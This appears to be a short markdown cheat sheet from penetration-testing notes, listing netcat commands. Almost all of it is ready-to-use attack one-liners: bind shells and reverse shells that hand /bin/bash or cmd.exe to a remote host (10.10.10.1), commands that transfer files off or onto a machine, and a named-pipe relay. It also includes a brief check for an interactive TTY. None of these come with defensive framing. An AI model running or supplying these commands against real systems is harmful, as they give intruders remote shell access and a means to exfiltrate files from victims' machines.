

  
  
If bind/ reverse bind won't properly execute binaries, verify whether it's a [fully interactive TTY](Fully%20Interactive%20TTY.md):
	Should see:
```bash
tty
	/dev/pts/0
```


 

##### Bind Shells:  
```bash
nc -lvp 2222 -e cmd.exe  
nc -lvp 2222 -e /bin/bash
```

##### Reverse bind:  
```bash
nc -nv 10.10.10.1 -e cmd.exe  
nc -nv 10.10.10.1 -e /bin/bash
```

##### Transfer files from:  
```bash
nc -w 3 [destination] [port] < out.file
```

##### Transfer files to:  
```bash
nc -nlvp [port] > in.file
```
 
##### Named pipes: 
```bash
mknod [pipe] p; nc -l -p [port] < [pipe] | nc [ip] [new_port] > [pipe]
```